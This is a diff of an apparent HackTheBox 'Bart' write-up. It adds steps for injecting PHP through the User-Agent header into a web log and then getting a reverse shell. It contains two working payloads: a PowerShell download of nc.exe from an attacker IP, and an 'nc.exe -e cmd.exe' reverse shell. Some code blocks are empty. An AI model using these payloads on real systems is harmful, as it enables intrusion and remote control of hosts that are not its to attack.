@@ -167,7 +167,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 {% endhighlight %}
 
-### 2. Getting User
+### 2. Getting Root
 
 By accessing "http://bart.htb/monitor", we can find a login console.
 ![placeholder](https://inar1.github.io/public/images/2019-10-08/bart-badge.png)
@@ -253,9 +253,37 @@ By registering, we can log in to the website.
 Then, click the "log" link. we can see something like web application log.
 ![placeholder](https://inar1.github.io/public/images/2019-10-08/bart-badge.png)
 
+By looking at the HTML source code, we can find an interesting link.<br>
+Looks like possible LFI or something.
+{% highlight shell %}
 
+{% endhighlight %}
 
-### 3. Getting Root
+Then, try to look at the file "log.txt".<br>
+Sounds like kind a log of Web server but only user agent is there.
+![placeholder](https://inar1.github.io/public/images/2019-10-08/bart-badge.png)
 
+This means, by putting a PHP code in User-agent, it's possible to run arbitrary code.<br>
+At the same time, we may notice this application is ran by NT authority.
+![placeholder](https://inar1.github.io/public/images/2019-10-08/bart-badge.png)
 
+After that, by using following commands, try to get a reverse shell.
+Running simple HTTP server host nc.exe:
+{% highlight shell %}
 
+{% endhighlight %}
+
+PHP payload to upload nc.exe to Bart.
+{% highlight shell %}
+<?php echo exec("powershell -command \"(New-Object System.Net.WebClient).DownloadFile('http://10.10.15.171:7777/nc.exe','nc.exe')\""); ?>
+{% endhighlight %}
+
+Running netcat listener:
+{% highlight shell %}
+
+{% endhighlight %}
+
+PHP payload to get reverse shell.
+{% highlight shell %}
+<?php exec("nc.exe 10.10.15.171 6667 -e cmd.exe"); ?>
+{% endhighlight %}
